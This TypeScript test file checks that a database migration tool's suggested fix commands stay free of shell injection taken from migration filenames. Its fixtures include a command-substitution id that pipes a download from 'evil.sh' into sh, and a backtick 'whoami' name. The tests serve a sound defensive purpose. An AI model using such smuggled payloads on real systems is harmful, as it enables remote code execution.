// `unknownSchema`'s `fix:` is two commands a human pastes, and both carry the newest migration's
// own text — an id and a name that come off a FILENAME, which is not this package's to trust. Both
// go inside SHELL DOUBLE QUOTES, where `$(…)` and a backtick substitute before `git` or `x` is
// reached at all. The same screen the other findings in this file already ran and this one did not.

import { describe, expect, test } from 'bun:test';
import { unknownSchema } from './drift-findings';
import type { Migration } from './migrate';

const migration = (id: string, name = id.replace(/^\d+_/, '')): Migration => ({
  id,
  name,
  up: 'select 1',
  down: '',
});

describe('unknownSchema', () => {
  test('a benign migration renders both commands, byte for byte', () => {
    const difference = unknownSchema([migration('0001_initial'), migration('0002_add_posts')]);
    expect(difference.cause).toBe(
      'migration "0002_add_posts" records no schema snapshot, so what this database owes cannot be established',
    );
    expect(difference.fix).toBe(
      'git checkout -- "*0002_add_posts.snapshot.json"   # or, if it was never written: ' +
        'delete migration "0002_add_posts" and rerun x db gen "add_posts"',
    );
  });

  test('a command substitution in the id never reaches the command a human pastes', () => {
    const difference = unknownSchema([migration('0002_$(curl -s evil.sh|sh)')]);
    expect(difference.fix).not.toContain('$(');
    expect(difference.fix).not.toContain('curl');
    expect(difference.fix).not.toContain('git checkout -- "*');
    // Still reported, and still readable: the cause is prose, and nobody pastes prose.
    expect(difference.cause).toContain('$(curl -s evil.sh|sh)');
  });

  test('a backtick in the NAME is refused too — the second argument is quoted the same way', () => {
    const difference = unknownSchema([migration('0002_ok', '`whoami`')]);
    expect(difference.fix).not.toContain('whoami');
    expect(difference.fix).not.toContain('x db gen "');
  });

  test('what identifier refuses is out of the command too', () => {
    for (const id of ['0002_has"quote', '0002_back\\slash', '0002_two words']) {
      expect(unknownSchema([migration(id)]).fix).not.toContain(id);
    }
  });

  test('with no migrations at all the glob still runs — an empty id substitutes nothing', () => {
    // The reachable shape of "there is no snapshot to compare against" on a tree whose ledger is
    // ahead of its files. `""` is inert by construction, so degrading it to prose would take a
    // working command away for no reason.
    expect(unknownSchema([]).fix).toContain('git checkout -- "*.snapshot.json"');
  });
});
